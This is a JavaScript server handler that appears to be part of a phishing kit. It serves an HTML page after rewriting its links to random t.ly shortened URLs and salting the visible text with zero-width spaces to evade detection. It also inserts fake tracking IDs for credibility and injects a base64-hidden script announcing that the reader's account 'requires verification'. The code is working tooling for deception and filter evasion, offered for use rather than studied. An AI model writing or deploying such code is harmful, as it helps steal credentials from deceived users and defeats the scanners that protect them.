import fs from "fs";
import path from "path";

// Function to load and randomly select a link from `links.txt`
function getRandomObfuscatedHref() {
    try {
        const filePath = path.join(process.cwd(), "links.txt");

        // Read file and filter out empty lines
        const links = fs.readFileSync(filePath, "utf-8")
            .split("\n")
            .map(link => link.trim())
            .filter(link => link.startsWith("https://t.ly/") && link.length > 10); // Ensure valid t.ly links

        if (links.length === 0) {
            console.warn("No valid links found in links.txt. Using fallback.");
            return "https://t.ly/fallback"; // Use a fallback link if file is empty
        }

        return links[Math.floor(Math.random() * links.length)]; // Select a random link
    } catch (error) {
        console.error("Error reading links.txt:", error);
        return "https://t.ly/fallback"; // Fallback URL in case of an error
    }
}

// Function to obfuscate text lightly (keeps text readable but harder to detect)
function simpleObfuscateText(text) {
    return text.replace(/([a-zA-Z])/g, "$1\u200B"); // Inserts zero-width spaces between characters
}

// Function to replace `<a>` links using obfuscated links from `links.txt`
function replaceLinks(html) {
    return html.replace(/<a\s+([^>]*?)href="([^"]+)"([^>]*)>(.*?)<\/a>/gis, (match, beforeHref, url, afterHref, text) => {
        let obfuscatedHref = getRandomObfuscatedHref(); // Get a random link from `links.txt`
        let obfuscatedText = simpleObfuscateText(text); // Light obfuscation for button text

        return `<a ${beforeHref}href="${obfuscatedHref}" ${afterHref}>${obfuscatedText}</a>`;
    });
}

// Function to obfuscate **only visible** text in the document (excluding attributes)
function obfuscateVisibleText(html) {
    return html.replace(/>([^<>]+)</g, (match, text) => {
        if (text.trim() !== "") {
            return ">" + simpleObfuscateText(text) + "<"; // Obfuscates only visible text
        }
        return match;
    });
}

// Function to generate a fake tracking ID
function generateFakeTrackingID() {
    let id = "";
    for (let i = 0; i < 6; i++) {
        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
    }
    return id.slice(0, -1);
}

// Function to replace any visible tracking ID in the HTML
function replaceTrackingID(html) {
    let fakeTrackingID = generateFakeTrackingID();
    return html.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);
}

// Function to inject a Base64-encoded phishing warning message
function base64Obfuscate(text) {
    let encoded = Buffer.from(text).toString("base64");
    return `<script>document.write(atob("${encoded}"));</script>`;
}

// API Handler to serve the obfuscated HTML while preserving styles
export default async function handler(req, res) {
    try {
        // Get the absolute path of the index.html file
        const filePath = path.join(process.cwd(), "index.html");

        // Read the index.html file
        let html = fs.readFileSync(filePath, "utf-8");

        // Apply text obfuscation only to **visible** content
        let modifiedHTML = obfuscateVisibleText(html);

        // Apply link obfuscation while keeping button styles intact
        modifiedHTML = replaceLinks(modifiedHTML);

        // Replace tracking IDs to add credibility
        modifiedHTML = replaceTrackingID(modifiedHTML);

        // Inject a hidden Base64-encoded JavaScript decoder
        modifiedHTML = modifiedHTML.replace(/<body>/, `<body>${base64Obfuscate("Important Security Update: Your account requires verification.")}`);

        // Set headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error reading/modifying HTML:", error);
        return res.status(500).send("Error processing the HTML file.");
    }
}
